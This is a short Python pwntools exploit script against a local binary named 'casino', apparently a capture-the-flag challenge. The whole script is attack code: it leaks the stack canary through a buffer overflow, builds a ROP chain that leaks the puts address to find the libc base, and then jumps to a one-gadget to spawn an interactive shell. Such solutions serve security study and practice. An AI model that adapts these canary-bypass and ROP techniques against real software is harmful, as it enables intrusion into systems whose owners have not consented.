from pwn import *

lib  = ELF("/lib/x86_64-linux-gnu/libc.so.6")
e = ELF("./casino")
p = process("./casino")

p.sendlineafter(">>> ", "1")
p.sendlineafter("money:", "-999999")
p.sendlineafter("lucky number:", "1")
p.sendlineafter(">>> ", "3")

puts_plt = e.symbols['puts']
pop_rdi = 0x00401083 # pop rdi ; ret  ;  (1 found)

#canary leak!
payload  = "A"*40
p.sendlineafter("your name:", payload)
p.recvuntil("i really impressed with your money")
p.recv(41)
canary = p.recv(8)
log.info("canary : %X" % u64(canary))

#bof & rop
payload  = "A"*40 + canary
payload += p64(0xdeadbeef)	# sfp
payload += p64(pop_rdi)
payload += p64(e.got['puts'])
payload += p64(puts_plt)
payload += p64(0x400D72) # return reward~

p.sendlineafter(">>> ", "3")
p.sendlineafter("your name:", payload)

p.recvuntil("i really impressed with your money\n")
p.recv(48)
puts_addr = p.recv(6)
puts_addr = u64(puts_addr+"\00"*2)
log.info("puts_addr : 0x%x" % puts_addr)

puts_offset = lib.symbols['puts']

libc_base = puts_addr - puts_offset
oneshot = libc_base+0x46428

#bof & oneshot!
payload  = "A"*40 + canary
payload += p64(0xdeadbeef)	# sfp
payload += p64(oneshot)

p.sendlineafter("your name:", payload)

p.interactive()